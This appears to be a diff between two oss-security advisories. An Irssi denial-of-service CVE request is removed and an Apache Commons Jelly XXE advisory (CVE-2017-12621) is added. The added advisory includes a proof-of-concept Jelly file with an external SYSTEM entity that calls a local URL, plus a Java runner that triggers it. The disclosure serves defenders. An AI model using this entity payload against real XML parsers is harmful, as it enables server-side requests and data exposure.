@@ -1,118 +1,75 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/01/05/2
-Message-ID: <1483627520.30912.1.camel@gmail.com>
-Date: Thu, 05 Jan 2017 15:45:20 +0100
-From: Ailin Nemui <ailin.nemui@...il.com>
-To: oss-security@...ts.openwall.com
-Subject: CVE Request: Irssi Multiple Vulnerabilities (2017/01)
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/09/27/6
+Message-Id: <38CA08B7-2456-4D56-AF60-BE1168ECE522@apache.org>
+Date: Wed, 27 Sep 2017 09:05:46 -0400
+From: Rob Tompkins <chtompki@...che.org>
+To: announce@...che.org, Commons Developers List <dev@...mons.apache.org>, Commons Users List <user@...mons.apache.org>, Luca Carettoni <luca@...ensec.com>, oss-security@...ts.openwall.com
+Cc: security@...che.org, "<private@...mons.apache.org>" <private@...mons.apache.org>
+Subject: [SECURITY] CVE-2017-12621 Apache Commons Jelly connects to URL with custom doctype definitions.
 Content-Type: text/plain; charset=utf-8
 
-Dear oss-security List,
+CVE-2017-12621: Apache Commons Jelly connects to URL with custom doctype definitions.
 
-Please provide some CVEs for the following issues.
+Severity: Medium
 
-Thanks,
+Vendor:
+The Apache Software Foundation
 
+Versions Affected:
+commons-jelly-1.0 (core), namely commons-jelly-1.0.jar
 
-Multiple vulnerabilities in Irssi [1]
-=====================================
+Description:
+During Jelly (xml) file parsing with Apache Xerces, if a custom doctype entity is declared with a “SYSTEM” entity with a URL and that entity is used in the body of the Jelly file, during parser instantiation the parser will attempt to connect to said URL. This could lead to XML External Entity (XXE) attacks. The Open Web Application Security Project suggests that the fix be https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#XMLReader
 
+Mitigation:
+1.0 users should migrate to 1.0.1.
 
-Description
------------
+Example:
 
-Four vulnerabilities have been located in Irssi.
+example.jelly
+--------------
+<?xml version="1.0"?>
+<!---
+ Licensed to the Apache Software Foundation (ASF) under one or more
+ contributor license agreements.  See the NOTICE file distributed with
+ this work for additional information regarding copyright ownership.
+ The ASF licenses this file to You under the Apache License, Version 2.0
+ (the "License"); you may not use this file except in compliance with
+ the License.  You may obtain a copy of the License at
+      http://www.apache.org/licenses/LICENSE-2.0
+ Unless required by applicable law or agreed to in writing, software
+ distributed under the License is distributed on an "AS IS" BASIS,
+ WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ See the License for the specific language governing permissions and
+ limitations under the License.
+-->
+<!DOCTYPE r [
+        <!ELEMENT r ANY >
+        <!ENTITY sp SYSTEM "http://127.0.0.1:4444/">
+        ]>
+<r>&sp;</r>
+<j:jelly trim="false" xmlns:j="jelly:core"
+         xmlns:x="jelly:xml"
+         xmlns:html="jelly:html">
+</j:jelly>
+--------------
 
-(a) A NULL pointer dereference in the nickcmp function found by Joseph
-    Bisch. (CWE-690)
-
-(b) Use after free when receiving invalid nick message (Issue #466, CWE-146)
-
-(c) Out of bounds read in certain incomplete control codes found by
-    Joseph Bisch. (CWE-126)
-
-(d) Out of bounds read in certain incomplete character sequences found
-    by Hanno Böck and independently by J. Bisch. (CWE-126)
-
-
-Impact
-------
-
-These issues may result in denial of service (remote crash).
-
-
-Affected versions
------------------
-
-(a) All Irssi versions that we observed
-(b) All Irssi versions that we observed
-(c) Irssi 0.8.17 and later
-(d) Irssi 0.8.18 and later
-
-
-Fixed in
---------
-
-Irssi 0.8.21, Irssi 1.0.0
-
-
-Recommended action
+ExampleParser.java
 ------------------
+public class ExampleParser {
+	
+	public static void main(String[] args) throws JellyException, IOException, 
+					NoSuchMethodException, IllegalAccessException,IllegalArgumentException, 
+					InvocationTargetException {
+		JellyContext context = new JellyContext();
+		context.runScript("example.jelly", null);
+	}
+}
 
-Upgrade to Irssi 0.8.21. Irssi 0.8.21 is a maintenance release
-without any new features.
+Credit:
+This was discovered by Luca Carettoni of Doyensec.
 
-After installing the updated packages, one can issue the /upgrade
-command to load the new binary. TLS connections will require
-/reconnect.
+References:
+[1] http://commons.apache.org/jelly/security-reports.html
+[2] https://issues.apache.org/jira/browse/JELLY-293
 
-
-A Note to Distributors
-----------------------
-
-First of all, thanks to every maintainer for their awesome job in
-packaging Irssi and backporting security fixes.
-
-When we had to release a security advisory last year with Irssi
-0.8.20, we noticed there was a huge confusion amongst Ubuntu users
-about whether their Irssi version was safe to use.
-
-Since all our releases 0.8.19, 0.8.20 and 0.8.21 have been bug
-fix only, we think distributions should just ship the release.
-
-But if the security fixes only are backported on top of an old
-version, we would like to urge distributions to consider indicating
-this in a way that is visible inside Irssi. One way to do this would
-be to manually overwrite the PACKAGE_VERSION and marking your package
-as patched. This can be done for example like this:
-
-  ./configure PACKAGE_VERSION=0.8.17-sa201701
-
-
-You can then check the version from inside Irssi with /eval echo $J
-
-As an added benefit over relying on dpkg, this will also correctly
-report whether you had /upgrade done or not. We are looking for a ways
-to make this easier to handle for both packagers and us, so if you
-have a good idea on this matter please speak forth.
-
-
-Mitigating facts
-----------------
-
-(a) requires control over the ircd
-
-(b), (d) require control over the ircd or otherwise can be triggered /
-    avoided by the user themselves
-
-
-Patch
------
-
-https://github.com/irssi/irssi/commit/6c6c42e3d1b49d90aacc0b67f8540471cae02a1d
-
-
-References
-----------
-
-[1] https://irssi.org/security/irssi_sa_2017_01.txt
